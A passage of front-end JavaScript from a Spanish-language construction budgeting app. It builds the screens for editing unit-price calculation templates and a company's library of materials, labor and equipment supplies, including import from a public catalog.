    const tid = Number(t.id);
    const editable = _apuTplEditable(t);
    const lines = t.lines || [];
    const total = lines.find(l => l.is_total);
    const cloneBtn = `<button class="btn btn-sm btn-secondary" onclick="showApuTemplateCloneModal(${tid}, '${escJs(t.name)}')">
                          ${icon('copy', 14)} ${editable ? 'Clonar' : 'Clonar para editar'}
                      </button>`;
    return `
        <div class="tpl-card${editable ? '' : ' locked'}">
            <div class="tpl-card-top">
                <span class="tpl-card-name">${esc(t.name)}</span>
                ${editable ? '' : `<span class="tpl-lock" title="Plantilla global: solo lectura">${icon('lock', 14)}</span>`}
            </div>
            ${t.description ? `<div class="tpl-card-desc">${esc(t.description)}</div>` : ''}
            <div class="tpl-card-meta">
                <span>${esc(String(lines.length))} filas</span>
                ${total ? `<span class="apu-dot"></span><span>Precio final: ${esc(total.name || total.code || '')}</span>` : ''}
                ${t.source_template_id ? `<span class="apu-dot"></span><span>Clon de #${esc(String(t.source_template_id))}</span>` : ''}
            </div>
            <div class="tpl-card-actions">
                ${editable
                    ? `<button class="btn btn-sm btn-primary" onclick="openApuTemplateEditor(${tid})">${icon('edit', 14)} Editar</button>`
                    : `<button class="btn btn-sm btn-secondary" onclick="openApuTemplateEditor(${tid})">${icon('file-text', 14)} Ver filas</button>`}
                ${cloneBtn}
                ${editable ? `<button class="btn btn-sm btn-danger" onclick="deleteApuTemplate(${tid}, '${escJs(t.name)}')">${icon('trash', 14)}</button>` : ''}
            </div>
        </div>
    `;
}

// ── Alta y clonado ────────────────────────────────────────────
function showApuNewTemplateModal() {
    const projOpt = _apuTpl.projectId
        ? `<div class="form-group">
               <label class="form-label">Alcance</label>
               <select class="form-select" name="scope">
                   <option value="company">De mi empresa (todos los proyectos)</option>
                   <option value="project">Solo para esta obra</option>
               </select>
           </div>`
        : '';
    showModal('Nueva plantilla de calculo', `
        <form onsubmit="handleApuCreateTemplate(event)">
            <div class="form-group">
                <label class="form-label">Nombre *</label>
                <input class="form-input" name="name" required maxlength="120" placeholder="Ej. Recargos obra publica 2026">
            </div>
            <div class="form-group">
                <label class="form-label">Descripcion</label>
                <textarea class="form-input" name="description" maxlength="400" placeholder="Para que sirve esta plantilla"></textarea>
            </div>
            ${projOpt}
            <p class="apu-hint">Se crea con las filas base (materiales, mano de obra y equipo). Luego podras agregar recargos y marcar cual fila es el precio final.</p>
            <div style="text-align:right;margin-top:12px">
                <button type="button" class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
                <button type="submit" class="btn btn-primary">Crear plantilla</button>
            </div>
        </form>
    `);
}

async function handleApuCreateTemplate(e) {
    e.preventDefault();
    const f = e.target;
    const scope = f.scope ? f.scope.value : 'company';
    const payload = {
        name: f.name.value.trim(),
        description: f.description.value.trim() || null,
        project_id: (scope === 'project' && _apuTpl.projectId) ? Number(_apuTpl.projectId) : null,
        lines: [
            { code: 'A', name: 'Materiales',   type: 'sum_mat', value: 0, formula: null, is_total: false, sequence: 1 },
            { code: 'B', name: 'Mano de obra', type: 'sum_mo',  value: 0, formula: null, is_total: false, sequence: 2 },
            { code: 'C', name: 'Equipo y herramientas', type: 'sum_eq', value: 0, formula: null, is_total: false, sequence: 3 },
            { code: 'D', name: 'Costo directo', type: 'formula', value: 0, formula: 'A + B + C', is_total: true, sequence: 4 },
        ],
    };
    try {
        const resp = await API._fetch('/apu/templates', { method: 'POST', body: JSON.stringify(payload) });
        let data = {};
        try { data = await resp.json(); } catch {}
        if (!resp.ok || data.ok === false) {
            toast(_apuDetailList(data)[0] || 'No se pudo crear la plantilla', 'error');
            return;
        }
        closeModal();
        toast('Plantilla creada', 'success');
        if (data.data && data.data.id) openApuTemplateEditor(data.data.id);
        else loadApuTemplates();
    } catch { toast('Error de conexion', 'error'); }
}

function showApuTemplateCloneModal(templateId, name) {
    const projOpt = _apuTpl.projectId
        ? `<div class="form-group">
               <label class="form-label">Alcance de la copia</label>
               <select class="form-select" name="scope">
                   <option value="company">De mi empresa (todos los proyectos)</option>
                   <option value="project">Solo para esta obra</option>
               </select>
           </div>`
        : '';
    showModal('Clonar plantilla', `
        <form onsubmit="handleApuTemplateClone(event, ${Number(templateId)})">
            <p class="apu-hint" style="margin-bottom:12px">
                Se crea una copia editable de <strong>${esc(name)}</strong> con todas sus filas. La original no se modifica.
            </p>
            <div class="form-group">
                <label class="form-label">Nombre de la copia *</label>
                <input class="form-input" name="name" required maxlength="120" value="${esc(name)} (copia)">
            </div>
            ${projOpt}
            <div style="text-align:right;margin-top:12px">
                <button type="button" class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
                <button type="submit" class="btn btn-primary">Clonar</button>
            </div>
        </form>
    `);
}

async function handleApuTemplateClone(e, templateId) {
    e.preventDefault();
    const f = e.target;
    const scope = f.scope ? f.scope.value : 'company';
    const payload = {
        name: f.name.value.trim() || null,
        project_id: (scope === 'project' && _apuTpl.projectId) ? Number(_apuTpl.projectId) : null,
    };
    try {
        const resp = await API.apuCloneTemplate(templateId, payload);
        if (!resp.ok) { toast(_apuDetailList(resp)[0] || 'No se pudo clonar', 'error'); return; }
        closeModal();
        toast('Plantilla clonada', 'success');
        if (resp.data && resp.data.id) openApuTemplateEditor(resp.data.id);
        else loadApuTemplates();
    } catch { toast('Error de conexion', 'error'); }
}

async function deleteApuTemplate(templateId, name) {
    if (!confirm(`Eliminar la plantilla "${name}"?`)) return;
    try {
        const resp = await API._fetch(`/apu/templates/${Number(templateId)}`, { method: 'DELETE' });
        let data = {};
        try { data = await resp.json(); } catch {}
        if (resp.status === 409) {
            showModal('No se puede eliminar', `
                <p style="font-size:14px;color:var(--gray-700);line-height:1.5">
                    ${esc(_apuDetailList(data)[0] || 'La plantilla esta en uso por uno o mas proyectos.')}
                </p>
                <div style="text-align:right;margin-top:16px">
                    <button class="btn btn-primary" onclick="closeModal()">Entendido</button>
                </div>
            `);
            return;
        }
        if (!resp.ok || data.ok === false) {
            toast(_apuDetailList(data)[0] || 'No se pudo eliminar', 'error');
            return;
        }
        toast('Plantilla eliminada', 'success');
        loadApuTemplates();
    } catch { toast('Error de conexion', 'error'); }
}

// ── Editor de filas ───────────────────────────────────────────
async function openApuTemplateEditor(templateId) {
    const page = document.getElementById('page-content');
    if (!page) return;
    page.innerHTML = '<div class="empty-state"><p>Cargando plantilla...</p></div>';
    try {
        const resp = await API.apuTemplate(templateId);
        if (!resp.ok) {
            page.innerHTML = `<div class="empty-state"><p>${esc(_apuDetail(resp, 'No se pudo cargar la plantilla'))}</p></div>`;
            return;
        }
        const t = resp.data || {};
        _apuTpl.errors = [];
        _apuTpl.editing = {
            id: t.id,
            name: t.name || '',
            description: t.description || '',
            is_global: !!t.is_global,
            editable: _apuTplEditable(t),
            scope: _apuTplScope(t),
            project_id: t.project_id || null,
            lines: (t.lines || [])
                .slice()
                .sort((a, b) => Number(a.sequence || 0) - Number(b.sequence || 0))
                .map(l => ({
                    id: l.id || null,
                    code: l.code || '',
                    name: l.name || '',
                    type: l.type || 'percent',
                    value: Number(l.value || 0),
                    formula: l.formula || '',
                    is_total: !!l.is_total,
                })),
        };
        renderApuTemplateEditor();
    } catch {
        page.innerHTML = '<div class="empty-state"><p>Error de conexion</p></div>';
    }
}

function renderApuTemplateEditor() {
    const page = document.getElementById('page-content');
    const t = _apuTpl.editing;
    if (!page || !t) return;
    const ro = !t.editable;

    page.innerHTML = `
        <div class="apu-back">
            <button class="btn btn-secondary btn-sm" onclick="loadApuTemplates()">&larr; Plantillas</button>
        </div>

        <div class="tpl-hero">
            <div class="tpl-hero-main">
                <div class="tpl-hero-top">
                    <span class="badge ${ro ? 'badge-gray' : 'badge-primary'}">${ro ? 'Solo lectura' : 'Editable'}</span>
                    ${ro ? `<span class="tpl-lock">${icon('lock', 14)}</span>` : ''}
                </div>
                <h1 class="tpl-hero-title">${esc(t.name)}</h1>
                ${t.description ? `<p class="tpl-hero-desc">${esc(t.description)}</p>` : ''}
                ${ro ? `<p class="apu-hint">Esta plantilla es global. Para adaptarla a tu empresa, clonala y edita la copia.</p>` : ''}
            </div>
            <div class="tpl-hero-actions">
                ${ro
                    ? `<button class="btn btn-primary" onclick="showApuTemplateCloneModal(${Number(t.id)}, '${escJs(t.name)}')">${icon('copy', 15)} Clonar para editar</button>`
                    : `<button class="btn btn-primary" onclick="saveApuTemplate()">${icon('check', 15)} Guardar cambios</button>`}
            </div>
        </div>

        <div id="apu-tpl-errors">${_apuTplErrorsHtml()}</div>

        ${ro ? '' : `
        <div class="tpl-meta-form">
            <div class="form-group">
                <label class="form-label">Nombre</label>
                <input class="form-input" id="apu-tpl-name" maxlength="120" value="${esc(t.name)}"
                       oninput="apuTplMetaSet('name', this.value)">
            </div>
            <div class="form-group">
                <label class="form-label">Descripcion</label>
                <input class="form-input" id="apu-tpl-desc" maxlength="400" value="${esc(t.description)}"
                       oninput="apuTplMetaSet('description', this.value)">
            </div>
        </div>`}

        <section class="tpl-editor">
            <header class="tpl-editor-head">
                ${icon('sliders', 16)}
                <span>Filas de la plantilla</span>
                <span class="apu-comp-hint">El orden define como se encadenan los calculos. Marca cual fila es el precio unitario final.</span>
            </header>
            <div class="table-wrap">
                <table class="apu-table tpl-table">
                    <thead>
                        <tr>
                            <th style="width:70px">Codigo</th>
                            <th>Nombre</th>
                            <th style="width:160px">Tipo</th>
                            <th style="width:100px" class="apu-th-num">Valor %</th>
                            <th style="width:200px">Formula</th>
                            <th style="width:80px" class="apu-th-num">Final</th>
                            <th style="width:96px"></th>
                        </tr>
                    </thead>
                    <tbody id="apu-tpl-rows">${_apuTplRowsHtml()}</tbody>
                </table>
            </div>
            ${ro ? '' : `
            <div class="tpl-editor-foot">
                <button class="btn btn-sm btn-secondary" onclick="apuTplAddLine()">${icon('plus', 14)} Agregar fila</button>
                <button class="btn btn-sm btn-primary" onclick="saveApuTemplate()">${icon('check', 14)} Guardar cambios</button>
            </div>`}
        </section>

        <div class="tpl-legend">
            ${APU_TPL_LINE_TYPES.map(x => `<div class="tpl-legend-item"><strong>${esc(x.label)}</strong><span>${esc(x.hint)}</span></div>`).join('')}
        </div>
    `;
}

function _apuTplErrorsHtml() {
    if (!_apuTpl.errors.length) return '';
    return `
        <div class="tpl-errors">
            <div class="tpl-errors-title">${icon('info', 15)} Revisa estas filas antes de guardar</div>
            <ul>${_apuTpl.errors.map(m => `<li>${esc(m)}</li>`).join('')}</ul>
        </div>
    `;
}

function _apuTplRowsHtml() {
    const t = _apuTpl.editing;
    if (!t) return '';
    const ro = !t.editable;
    if (!t.lines.length) {
        return '<tr><td colspan="7" class="apu-block-empty">La plantilla no tiene filas</td></tr>';
    }
    return t.lines.map((l, idx) => {
        const isPercent = l.type === 'percent';
        const isFormula = l.type === 'formula' || l.type === 'percent';
        return `
            <tr class="${l.is_total ? 'tpl-row-total' : ''}">
                <td>
                    <input class="apu-inp apu-inp-text tpl-inp-code" type="text" maxlength="8" ${ro ? 'disabled' : ''}
                           value="${esc(l.code)}" aria-label="Codigo"
                           oninput="apuTplLineSet(${idx}, 'code', this.value)">
                </td>
                <td>
                    <input class="apu-inp apu-inp-text" type="text" maxlength="120" ${ro ? 'disabled' : ''}
                           value="${esc(l.name)}" aria-label="Nombre"
                           oninput="apuTplLineSet(${idx}, 'name', this.value)">
                </td>
                <td>
                    <select class="apu-inp apu-inp-sel" ${ro ? 'disabled' : ''} aria-label="Tipo"
                            onchange="apuTplTypeChange(${idx}, this.value)">
                        ${APU_TPL_LINE_TYPES.map(x => `<option value="${esc(x.key)}"${l.type === x.key ? ' selected' : ''}>${esc(x.label)}</option>`).join('')}
                    </select>
                </td>
                <td>
                    <input class="apu-inp" type="number" step="0.01" ${(ro || !isPercent) ? 'disabled' : ''}
                           value="${esc(Number(l.value || 0).toFixed(2))}" aria-label="Valor porcentual"
                           oninput="apuTplLineSet(${idx}, 'value', this.value)">
                </td>
                <td>
                    <input class="apu-inp apu-inp-text tpl-inp-formula" type="text" maxlength="200" ${(ro || !isFormula) ? 'disabled' : ''}
                           value="${esc(l.formula)}" aria-label="Formula"
                           placeholder="${isPercent ? 'Base. Ej: B' : 'Ej: A + B + C'}"
                           oninput="apuTplLineSet(${idx}, 'formula', this.value)">
                </td>
                <td class="apu-cell-act">
                    <input type="radio" name="apu-tpl-total" ${l.is_total ? 'checked' : ''} ${ro ? 'disabled' : ''}
                           title="Marcar como precio unitario final"
                           onchange="apuTplSetTotal(${idx})">
                </td>
                <td class="apu-cell-act">
                    ${ro ? '' : `
                    <button class="tpl-row-btn" title="Subir" onclick="apuTplMove(${idx}, -1)">${icon('arrow-up', 13)}</button>
                    <button class="tpl-row-btn" title="Bajar" onclick="apuTplMove(${idx}, 1)">${icon('arrow-down', 13)}</button>
                    <button class="apu-line-del" title="Eliminar fila" onclick="apuTplDeleteLine(${idx})">${icon('trash', 13)}</button>`}
                </td>
            </tr>
        `;
    }).join('');
}

function apuTplRerenderRows() {
    const box = document.getElementById('apu-tpl-rows');
    if (box) box.innerHTML = _apuTplRowsHtml();
}

function apuTplMetaSet(field, value) {
    if (!_apuTpl.editing) return;
    _apuTpl.editing[field] = String(value);
}

function apuTplLineSet(idx, field, value) {
    const t = _apuTpl.editing;
    if (!t || !t.lines[idx]) return;
    t.lines[idx][field] = field === 'value' ? (parseFloat(value) || 0) : String(value);
}

function apuTplTypeChange(idx, value) {
    const t = _apuTpl.editing;
    if (!t || !t.lines[idx]) return;
    t.lines[idx].type = String(value);
    apuTplRerenderRows();
}

function apuTplSetTotal(idx) {
    const t = _apuTpl.editing;
    if (!t) return;
    t.lines.forEach((l, i) => { l.is_total = (i === idx); });
    apuTplRerenderRows();
}

function apuTplAddLine() {
    const t = _apuTpl.editing;
    if (!t) return;
    t.lines.push({ id: null, code: '', name: '', type: 'percent', value: 0, formula: '', is_total: false });
    apuTplRerenderRows();
}

function apuTplDeleteLine(idx) {
    const t = _apuTpl.editing;
    if (!t || !t.lines[idx]) return;
    if (!confirm(`Eliminar la fila "${t.lines[idx].name || t.lines[idx].code || idx + 1}"?`)) return;
    t.lines.splice(idx, 1);
    apuTplRerenderRows();
}

function apuTplMove(idx, dir) {
    const t = _apuTpl.editing;
    if (!t) return;
    const to = idx + Number(dir);
    if (to < 0 || to >= t.lines.length) return;
    const [row] = t.lines.splice(idx, 1);
    t.lines.splice(to, 0, row);
    apuTplRerenderRows();
}

async function saveApuTemplate() {
    const t = _apuTpl.editing;
    if (!t || !t.editable) return;
    if (!t.lines.length) { toast('La plantilla necesita al menos una fila', 'error'); return; }
    if (!t.lines.some(l => l.is_total)) { toast('Marca cual fila es el precio unitario final', 'error'); return; }

    const payload = {
        name: t.name.trim(),
        description: t.description.trim() || null,
        lines: t.lines.map((l, i) => ({
            code: l.code.trim(),
            name: l.name.trim(),
            type: l.type,
            value: Number(l.value) || 0,
            formula: l.formula && l.formula.trim() ? l.formula.trim() : null,
            is_total: !!l.is_total,
            sequence: i + 1,
        })),
    };

    try {
        const resp = await API._fetch(`/apu/templates/${Number(t.id)}`, { method: 'PUT', body: JSON.stringify(payload) });
        let data = {};
        try { data = await resp.json(); } catch {}
        if (resp.status === 422) {
            _apuTpl.errors = _apuDetailList(data);
            if (!_apuTpl.errors.length) _apuTpl.errors = ['La plantilla tiene errores de validacion'];
            const box = document.getElementById('apu-tpl-errors');
            if (box) { box.innerHTML = _apuTplErrorsHtml(); box.scrollIntoView({ behavior: 'smooth', block: 'center' }); }
            toast('Hay formulas invalidas', 'error');
            return;
        }
        if (resp.status === 403) {
            toast(_apuDetailList(data)[0] || 'Esta plantilla no se puede editar. Clonala primero.', 'error');
            return;
        }
        if (!resp.ok || data.ok === false) {
            toast(_apuDetailList(data)[0] || 'No se pudo guardar la plantilla', 'error');
            return;
        }
        _apuTpl.errors = [];
        toast('Plantilla guardada', 'success');
        openApuTemplateEditor(t.id);
    } catch { toast('Error de conexion', 'error'); }
}

// ═══════════════════════════════════════════════════════════════
// ── Biblioteca de insumos de la empresa ────────────────────────
// ═══════════════════════════════════════════════════════════════

const LIB_TYPES = [
    { key: '',    label: 'Todos' },
    { key: 'mat', label: 'Materiales' },
    { key: 'mo',  label: 'Mano de obra' },
    { key: 'eq',  label: 'Equipo' },
];

const _lib = {
    q: '',
    type: '',
    offset: 0,
    limit: 50,
    total: 0,
};

function _libTypeLabel(t) {
    const found = LIB_TYPES.find(x => x.key === String(t || '').toLowerCase());
    return found && found.key ? found.label : String(t || '');
}

function _libIsOwn(i) {
    return String(i.source_type || 'manual').toLowerCase() !== 'catalog';
}

async function renderBiblioteca() {
    if (!state.user) { showLoginModal(); return; }
    const page = document.getElementById('page-content');
    if (!page) return;

    const chips = LIB_TYPES.map(t => `
        <button class="chip${_lib.type === t.key ? ' active' : ''}" onclick="filterLibType('${escJs(t.key)}', this)">${esc(t.label)}</button>
    `).join('');

    page.innerHTML = `
        <div class="page-header apu-header">
            <div>
                <h1 class="page-title">Biblioteca de insumos</h1>
                <p class="page-subtitle">Los insumos propios de tu empresa y los que importaste del catalogo publico</p>
            </div>
            <div class="apu-header-actions">
                <button class="btn btn-secondary" onclick="showLibImportModal()">
                    ${icon('upload', 16)} Importar del catalogo
                </button>
                <button class="btn btn-primary" onclick="showLibInsumoForm()">
                    ${icon('plus', 16)} Nuevo insumo
                </button>
            </div>
        </div>

        <div class="lib-toolbar">
            <input class="form-input lib-search" id="lib-q" autocomplete="off"
                   value="${esc(_lib.q)}"
                   placeholder="Buscar por nombre o codigo..."
                   oninput="debounceLibSearch()">
            <div class="categories-bar">${chips}</div>
        </div>

        <div id="lib-list"><div class="empty-state"><p>Cargando insumos...</p></div></div>
        <div id="lib-pagination" class="lib-pagination"></div>
    `;
    loadCompanyInsumos(0);
}

let _libTimer = null;
function debounceLibSearch() {
    clearTimeout(_libTimer);
    _libTimer = setTimeout(() => {
        const el = document.getElementById('lib-q');
        _lib.q = el ? el.value.trim() : '';
        loadCompanyInsumos(0);
    }, 300);
}

function filterLibType(type, chipEl) {
    _lib.type = type || '';
    if (chipEl) {
        const bar = chipEl.closest('.categories-bar');
        if (bar) bar.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
        chipEl.classList.add('active');
    }
    loadCompanyInsumos(0);
}

async function loadCompanyInsumos(offset = 0) {
    const box = document.getElementById('lib-list');
    if (!box) return;
    _lib.offset = Number(offset) || 0;
    const q = new URLSearchParams();
    if (_lib.q) q.set('q', _lib.q);
    if (_lib.type) q.set('type', _lib.type);
    q.set('limit', String(_lib.limit));
    q.set('offset', String(_lib.offset));

    try {
        const resp = await API.companyInsumos('?' + q.toString());
        if (!resp.ok) {
            box.innerHTML = `<div class="empty-state"><p>${esc(_apuDetail(resp, 'No se pudo cargar la biblioteca'))}</p></div>`;
            return;
        }
        const list = resp.data || [];
        _lib.total = Number(resp.total != null ? resp.total : list.length);
        if (!list.length) {
            box.innerHTML = `
                <div class="apu-empty">
                    <div class="apu-empty-ico">${icon('book', 40)}</div>
                    <h3>${_lib.q || _lib.type ? 'Sin resultados' : 'Tu biblioteca esta vacia'}</h3>
                    <p>Crea insumos propios con los precios que manejas, o importa los que ya existen en el catalogo publico para tenerlos a mano en tus presupuestos.</p>
                    <button class="btn btn-secondary" onclick="showLibImportModal()">${icon('upload', 15)} Importar del catalogo</button>
                </div>
            `;
            renderLibPagination();
            return;
        }
        box.innerHTML = `
            <div class="table-wrap">
                <table class="apu-table lib-table">
                    <thead>
                        <tr>
                            <th style="width:110px">Codigo</th>
                            <th>Insumo</th>
                            <th style="width:120px">Tipo</th>
                            <th style="width:80px">Unidad</th>
                            <th style="width:140px">Categoria</th>
                            <th style="width:130px" class="apu-th-num">Precio ref.</th>
                            <th style="width:130px">Origen</th>
                            <th style="width:120px">Actualizado</th>
                            <th style="width:150px"></th>
                        </tr>
                    </thead>
                    <tbody>${list.map(renderLibRow).join('')}</tbody>
                </table>
            </div>
        `;
        renderLibPagination();
    } catch {
        box.innerHTML = '<div class="empty-state"><p>Error de conexion</p></div>';
    }
}

function renderLibRow(i) {
    const id = Number(i.id);
    const own = _libIsOwn(i);
    const origen = own
        ? '<span class="badge badge-gray">Propio</span>'
        : '<span class="badge badge-primary">Del catalogo</span>';
    const proposed = i.proposed_to_catalog
        ? '<span class="badge badge-warning lib-badge-prop" title="Ya enviado a revision">En revision</span>'
        : '';
    return `
        <tr>
            <td class="apu-cell-code">${esc(i.code || '—')}</td>
            <td class="apu-cell-name">${esc(i.name)}</td>
            <td class="apu-cell-uom">${esc(_libTypeLabel(i.type))}</td>
            <td class="apu-cell-uom">${esc(i.uom || '')}</td>
            <td class="apu-cell-uom">${esc(i.category || '')}</td>
            <td class="apu-cell-num apu-cell-strong">${esc(_apuMoney(i.reference_price, i.currency))}</td>
            <td>${origen} ${proposed}</td>
            <td class="apu-cell-uom">${esc(_apuDate(i.last_price_update))}</td>
            <td class="apu-cell-act lib-actions">
                <button class="tpl-row-btn" title="Editar" onclick="showLibInsumoForm(${id})">${icon('edit', 14)}</button>
                ${(own && !i.proposed_to_catalog)
                    ? `<button class="tpl-row-btn" title="Proponer al catalogo publico" onclick="proposeInsumoToCatalog(${id}, '${escJs(i.name)}')">${icon('send', 14)}</button>`
                    : ''}
                <button class="apu-line-del" title="Eliminar" onclick="deleteLibInsumo(${id}, '${escJs(i.name)}')">${icon('trash', 14)}</button>
            </td>
        </tr>
    `;
}

function renderLibPagination() {
    const box = document.getElementById('lib-pagination');
    if (!box) return;
    if (_lib.total <= _lib.limit) { box.innerHTML = ''; return; }
    const page = Math.floor(_lib.offset / _lib.limit) + 1;
    const pages = Math.ceil(_lib.total / _lib.limit);
    box.innerHTML = `
        <button class="btn btn-sm btn-secondary" ${_lib.offset <= 0 ? 'disabled' : ''}
                onclick="loadCompanyInsumos(${Math.max(0, _lib.offset - _lib.limit)})">&larr; Anterior</button>
        <span class="lib-page-info">Pagina ${esc(String(page))} de ${esc(String(pages))} &middot; ${esc(String(_lib.total))} insumos</span>
        <button class="btn btn-sm btn-secondary" ${page >= pages ? 'disabled' : ''}
                onclick="loadCompanyInsumos(${_lib.offset + _lib.limit})">Siguiente &rarr;</button>
    `;
}

// ── Alta / edicion manual ─────────────────────────────────────
function showLibInsumoForm(editId) {
    const uoms = UOM_LIST.length
        ? UOM_LIST.map(u => `<option value="${esc(u.key)}">${esc(u.key)} - ${esc(u.label)}</option>`).join('')
        : '';
    const cats = Object.entries(CATEGORY_META)
        .map(([k, v]) => `<option value="${esc(k)}">${esc(v.label || k)}</option>`).join('');
    const types = LIB_TYPES.filter(t => t.key)
        .map(t => `<option value="${esc(t.key)}">${esc(t.label)}</option>`).join('');

    showModal(editId ? 'Editar insumo' : 'Nuevo insumo propio', `
        <form onsubmit="handleLibInsumo(event, ${editId ? Number(editId) : 'null'})">
            <div class="form-group">
                <label class="form-label">Nombre *</label>
                <input class="form-input" name="name" id="lib-f-name" required maxlength="200" placeholder="Ej. Cemento IP-30 bolsa 50 kg">
            </div>
            <div class="apu-form-3">
                <div class="form-group">
                    <label class="form-label">Tipo *</label>
                    <select class="form-select" name="type" id="lib-f-type" required>${types}</select>
                </div>
                <div class="form-group">
                    <label class="form-label">Unidad *</label>
                    <input class="form-input" name="uom" id="lib-f-uom" required maxlength="20" list="lib-uom-list" placeholder="m3, kg, hr...">
                    <datalist id="lib-uom-list">${uoms}</datalist>
                </div>
                <div class="form-group">
                    <label class="form-label">Codigo</label>
                    <input class="form-input" name="code" id="lib-f-code" maxlength="40" placeholder="INS-001">
                </div>
            </div>
            <div class="apu-form-3">
                <div class="form-group">
                    <label class="form-label">Categoria</label>
                    <select class="form-select" name="category" id="lib-f-category">
                        <option value="">Sin categoria</option>
                        ${cats}
                    </select>
                </div>
                <div class="form-group">
                    <label class="form-label">Precio de referencia</label>
                    <input class="form-input" name="reference_price" id="lib-f-price" type="number" step="0.01" min="0" value="0.00">
                </div>
                <div class="form-group">
                    <label class="form-label">Moneda</label>
                    <select class="form-select" name="currency" id="lib-f-currency">
                        <option value="BOB">BOB — Bolivianos</option>
                        <option value="USD">USD — Dolares</option>
                    </select>
                </div>
            </div>
            ${editId ? '' : `
            <div class="form-group">
                <label class="form-label">Descripcion</label>
                <textarea class="form-input" name="description" maxlength="400" placeholder="Detalle, marca, especificacion tecnica"></textarea>
            </div>`}
            <div style="text-align:right;margin-top:12px">
                <button type="button" class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
                <button type="submit" class="btn btn-primary">${editId ? 'Guardar cambios' : 'Crear insumo'}</button>
            </div>
        </form>
    `);
    if (editId) loadLibInsumoIntoForm(editId);
}

async function loadLibInsumoIntoForm(id) {
    try {
        const q = new URLSearchParams({ limit: String(_lib.limit), offset: String(_lib.offset) });
        if (_lib.q) q.set('q', _lib.q);
        if (_lib.type) q.set('type', _lib.type);
        const resp = await API.companyInsumos('?' + q.toString());
        if (!resp.ok) return;
        const i = (resp.data || []).find(x => Number(x.id) === Number(id));
        if (!i) return;
        const set = (elId, val) => { const el = document.getElementById(elId); if (el) el.value = val; };
        set('lib-f-name', i.name || '');
        set('lib-f-type', i.type || 'mat');
        set('lib-f-uom', i.uom || '');
        set('lib-f-code', i.code || '');
        set('lib-f-category', i.category || '');
        set('lib-f-price', Number(i.reference_price || 0).toFixed(2));
        set('lib-f-currency', i.currency || 'BOB');
    } catch {}
}

async function handleLibInsumo(e, editId) {
    e.preventDefault();
    const f = e.target;
    const payload = {
        name: f.name.value.trim(),
        type: f.type.value,
        uom: f.uom.value.trim(),
        code: f.code.value.trim() || null,
        category: f.category.value || null,
        reference_price: parseFloat(f.reference_price.value) || 0,
    };
    if (!editId) {
        payload.currency = f.currency.value || 'BOB';
        payload.description = f.description.value.trim() || null;
    }
    try {
        const resp = editId
            ? await API.updateCompanyInsumo(editId, payload)
            : await API.createCompanyInsumo(payload);
        if (!resp.ok) { toast(_apuDetailList(resp)[0] || 'No se pudo guardar el insumo', 'error'); return; }
        closeModal();
        toast(editId ? 'Insumo actualizado' : 'Insumo creado', 'success');
        loadCompanyInsumos(_lib.offset);
    } catch { toast('Error de conexion', 'error'); }
}

async function deleteLibInsumo(id, name) {
    if (!confirm(`Eliminar "${name}" de tu biblioteca?`)) return;
    try {
        const resp = await API.deleteCompanyInsumo(id);
        if (!resp.ok) { toast(_apuDetailList(resp)[0] || 'No se pudo eliminar', 'error'); return; }
        toast('Insumo eliminado', 'success');
        loadCompanyInsumos(_lib.offset);
    } catch { toast('Error de conexion', 'error'); }
}

// ── Importar desde el catalogo publico ────────────────────────
function showLibImportModal() {
    showModal('Importar del catalogo publico', `
        <div class="form-group">
            <label class="form-label">Buscar en el catalogo de mercado</label>
            <div class="apu-search-wrap">
                <input class="form-input" id="lib-cat-q" autocomplete="off"
                       placeholder="Ej. cemento portland, albanil, mezcladora..."
                       oninput="debounceLibCatalogSearch()">
                <div id="lib-cat-results" class="apu-sug" style="display:none"></div>
            </div>
            <span class="apu-hint">Al importar, el insumo se copia a tu biblioteca con su unidad y precio actual. Queda marcado como "Del catalogo" y podras ajustarle el precio sin afectar el catalogo publico.</span>
        </div>
        <div id="lib-import-log" class="lib-import-log"></div>
        <div style="text-align:right;margin-top:12px">
            <button type="button" class="btn btn-secondary" onclick="closeModal()">Cerrar</button>
        </div>
    `);
}

let _libCatalogTimer = null;
function debounceLibCatalogSearch() {
    clearTimeout(_libCatalogTimer);
    _libCatalogTimer = setTimeout(libCatalogSearch, 250);
}

async function libCatalogSearch() {
    const input = document.getElementById('lib-cat-q');
    const box = document.getElementById('lib-cat-results');
    if (!input || !box) return;
    const q = input.value.trim();
    if (q.length < 2) { box.style.display = 'none'; box.innerHTML = ''; return; }
    try {
        // smart-search: embeddings + fallback trigram (misma fuente que el buscador publico)
        const resp = await API.smartSearch(q, null, 8);
        const base = (resp && resp.ok) ? [...(resp.data || []), ...(resp.suggestions || [])] : [];
        const seen = new Set();
        const items = base.filter(p => p.id && !seen.has(p.id) && (seen.add(p.id), true)).slice(0, 8);
        if (!items.length) {
            box.innerHTML = '<div class="apu-sug-empty">Sin resultados en el catalogo</div>';
            box.style.display = '';
            return;
        }
        box.innerHTML = items.map(p => `
            <div class="apu-sug-item" onclick="libImportFromCatalog(${Number(p.id)}, '${escJs(p.name)}')">
                <div>
                    <div class="apu-sug-name">${esc(p.name)}</div>
                    <div class="apu-sug-meta">${p.category ? esc(p.category) : ''}${p.uom ? ' &middot; ' + esc(p.uom) : ''}</div>
                </div>
                <span class="apu-sug-price">${p.ref_price ? esc(_apuNum(p.ref_price, 2)) : '—'}</span>
            </div>
        `).join('');
        box.style.display = '';
    } catch {
        box.style.display = 'none';
    }
}

async function libImportFromCatalog(insumoId, name) {
    const box = document.getElementById('lib-cat-results');
    if (box) { box.style.display = 'none'; box.innerHTML = ''; }
    const q = document.getElementById('lib-cat-q');
    if (q) q.value = '';
    try {
        const resp = await API.importCompanyInsumo(insumoId);
        if (!resp.ok) { toast(_apuDetailList(resp)[0] || 'No se pudo importar el insumo', 'error'); return; }
        const already = !!resp.already_existed;
        toast(already ? 'Ese insumo ya estaba en tu biblioteca' : 'Insumo importado', already ? 'info' : 'success');
        const log = document.getElementById('lib-import-log');
        if (log) {
            log.insertAdjacentHTML('afterbegin', `
                <div class="lib-import-row${already ? ' dup' : ''}">
                    ${icon(already ? 'info' : 'check-circle', 14)}
                    <span>${esc(name)}</span>
                    <span class="lib-import-tag">${already ? 'Ya existia' : 'Importado'}</span>
                </div>
            `);
        }
        loadCompanyInsumos(_lib.offset);
    } catch { toast('Error de conexion', 'error'); }
}

// ── Proponer un insumo propio al catalogo publico ─────────────
function proposeInsumoToCatalog(id, name) {
    showModal('Proponer al catalogo publico', `
        <p style="font-size:14px;color:var(--gray-700);line-height:1.55">
